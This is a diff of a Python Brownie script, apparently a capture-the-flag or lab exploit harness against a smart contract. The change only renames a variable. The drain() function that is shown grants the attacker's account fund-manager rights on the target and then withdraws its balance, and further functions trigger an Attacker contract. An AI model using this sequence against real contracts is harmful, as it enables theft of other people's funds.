@@ -55,9 +55,9 @@ def deploy():
 
 def query():
     try:
-        rdf_contract = Contract.from_abi("TargetContract", TARGET_ADDRESS, Target.abi)
+        target_contract = Contract.from_abi("TargetContract", TARGET_ADDRESS, Target.abi)
         print("Contract address:\t", TARGET_ADDRESS)
-        print("Contract balance:\t", rdf_contract.balance())
+        print("Contract balance:\t", target_contract.balance())
     except brownie.exceptions.ContractNotFound:
         print("Contract not found at address", TARGET_ADDRESS)
     except ValueError:
@@ -85,9 +85,9 @@ def exploit():
 
 def drain():
     # Get the funds after exploiting
-    rdf_contract = Contract.from_abi("TargetContract", TARGET_ADDRESS, Target.abi)
-    rdf_contract.addFundManager(my_account, {"from": my_account})
-    rdf_contract.withdraw({"from": my_account})
+    target_contract = Contract.from_abi("TargetContract", TARGET_ADDRESS, Target.abi)
+    target_contract.addFundManager(my_account, {"from": my_account})
+    target_contract.withdraw({"from": my_account})
 
 
 def gimme():
@@ -99,6 +99,7 @@ def gimme():
     else:
         attacker_contract.gimme({"from": my_account})
 
+
 def boom():
     try:
         attacker_contract = Contract.from_abi("Attacker", ATTACKER_ADDRESS, Attacker.abi)
@@ -107,7 +108,6 @@ def boom():
         return
     else:
         attacker_contract.boom({"from": my_account})
-
 
 
 def main():
